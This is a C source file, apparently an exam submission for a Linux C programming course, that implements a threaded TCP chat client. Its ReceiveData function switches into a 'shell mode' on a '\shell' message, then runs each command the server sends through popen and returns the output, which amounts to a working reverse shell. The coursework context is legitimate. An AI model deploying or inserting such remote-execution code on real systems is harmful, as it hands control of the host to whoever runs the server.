/*================================================
Eksam PG3401 C Programming for Linux , 
Task 5
Source: clientHandle.c
Description: clientHandle source file to implement
serveral functions 
Author: Candidate 1087 

==================================================*/

// Libraries //
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
// HEADERS //
#include "clientHandle.h"

// defined buffer // 
#define BUFFER_SIZE 1024

////////////////////////////////////////////////////////
// This function creates a new socket and handle errors
// during its creation process, its a int because 
// it returns a file descriptor reperesented as a int
////////////////////////////////////////////////////////

// create socket function //
int CreateSocket() {
    int iSockFd;
    if ((iSockFd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket failed");
        exit(EXIT_FAILURE);
    }
    return iSockFd;
}

/////////////////////////////////////////////////////////////////
// This is a function that sets up the server address structure
// it takes a pointer to a ServerInfo structure as its input
// parameter. which contains information for the server address
// such as ip or port number.
///////////////////////////////////////////////////////////////////

// Function that sets up address structure //
void SetServerAddr(ServerInfo *pServInfo) {
    // init memoryspace for server address 
    memset(&pServInfo->ServAddr,0, sizeof(pServInfo->ServAddr));
    pServInfo->ServAddr.sin_family = AF_INET;
    pServInfo->ServAddr.sin_port = htons(pServInfo->iPort);

    // ip address is stored in chServerIP Structure passed as a poiner 
    if (inet_pton(AF_INET, pServInfo->chServerIP, &pServInfo->ServAddr.sin_addr) <= 0) {
        perror("Invalid address or address not supported");
        exit(EXIT_FAILURE);
    }
}

////////////////////////////////////////////////////////////////////////////////
// This is the function that connects a socket to a server using the
// the server address information stored in the ServerInfo struct
//  If the connect() function returns a value less than 0, it means 
//  that the connection attempt failed. In this case, 
//  with perror message the function prints a message , connection failed 
///////////////////////////////////////////////////////////////////////////////// 
 
void ConnectToServer(int iSockFd, ServerInfo * pServInfo) {
    // connection btween the client socket and the server 
    if (connect(iSockFd, (struct sockaddr *)&pServInfo->ServAddr, sizeof(pServInfo->ServAddr)) < 0) {
        perror("Connection failed");
        exit(EXIT_FAILURE);
    }
}

////////////////////////////////////////////////////////////////////
// The function is designed to be run as a separate thread of 
// execution using the pthread_create() function in Main.c
// The function is running on a separate thread and takes a single
// argument  that is a pointer ti a integer, Then he function enters
// a infinite loop, reading input from stdin, sending in a buffer 
// The calling thread can determine if the function completed 
// successfully by checking the return of the value.
/////////////////////////////////////////////////////////////////////

void *SendData(void *pIsockFd) {
   
   // typecasting to converte a variable
   // of one data type to another
   // this is to obtain the value
   // of the socket as an int
    int iSockFd = *(int *)pIsockFd;
    char szBuffer[BUFFER_SIZE];
    
    // infinte loop
    while (1) {
        
        memset(szBuffer, 0, BUFFER_SIZE);
        fgets(szBuffer, BUFFER_SIZE, stdin);
        send(iSockFd, szBuffer, strlen(szBuffer), 0);
    }
    return NULL;
}

///////////////////////////////////////////////////////////////////////////////
//  This func recieves data from the server and process it. 
// the data es stored in the local variables lie szBuffer and
// iNum, The func the enters a while loop and waits to recieve data 
// using recv function. If the data matches the \\shell command
// it sets the iShellMode flag to 1 and replaces the  incomming buffer
// with the shell command, if it recieves a \\exit, it sets iShellMode
// to 0
// if the iShellMode executes the shell command using popen function 
// it sends back the output back to the server. Otherwise it prints output
// the recieved data on the console.
/////////////////////////////////////////////////////////////////////////////
void *ReceiveData(void *pIsockFd){
    int iSockFd = *(int *)pIsockFd;
    char szBuffer[BUFFER_SIZE];
    int iNum;
    const char *pShellCmd = "\\shell";
    char chCmdOut[BUFFER_SIZE];
    FILE *pfp;
    int iShellMode = 0;
    
    while(1){
        memset(szBuffer,0,BUFFER_SIZE);
        iNum = recv(iSockFd, szBuffer, BUFFER_SIZE,0);
        
        if(iNum <= 0){
            printf("Server Disconnected.\n");
            break;
        }
        
        if(!iShellMode && strncmp(szBuffer, pShellCmd, strlen(pShellCmd)) == 0){
            iShellMode = 1;
            memset(szBuffer, 0, BUFFER_SIZE);
            // this function comthe the shell command to the buffer
            // with a specified size ensuring that its not ovverun.
            // continue helps also to prevent that any data
            // being processd any further as it contains a shell command
            strncpy(szBuffer, "/bin/bash", BUFFER_SIZE - 1);
            continue;
        }
        // exit command tha tleaves \shell instance 
        else if(iShellMode && strncmp(szBuffer, "\\exit\n", 5) == 0){
            iShellMode = 0;
            continue;
        }
        
        // returning data to server 
        if(iShellMode){
            memset(chCmdOut, 0, BUFFER_SIZE);
            pfp = popen(szBuffer, "r");
            
            if(pfp == NULL){
                perror("Failed to run comand");
                send(iSockFd, "Error running command", 20, 0);
                continue;
            }
            
            /*  this code is executed when iShellMode is set
                then all the commands will be executed in shell instance
                the loop iterates over each line of the output
                using the fgets, reads from the pointer 
                the chCmdOut stores the output of the command.
                the memset clear the chCmdOut buffer  */
            
            while(fgets(chCmdOut, BUFFER_SIZE, pfp) != NULL){
                send(iSockFd, chCmdOut, strlen(chCmdOut), 0);
                memset(chCmdOut, 0, BUFFER_SIZE);
                
            }
            char szNewLine = '\n';
            send(iSockFd,&szNewLine,1,0);
            pclose(pfp);
        }
        else{
        
            printf("$Server>: %s\n", szBuffer);
        }
        
    }
    
    return NULL;

}
// ================ end of file =================== //
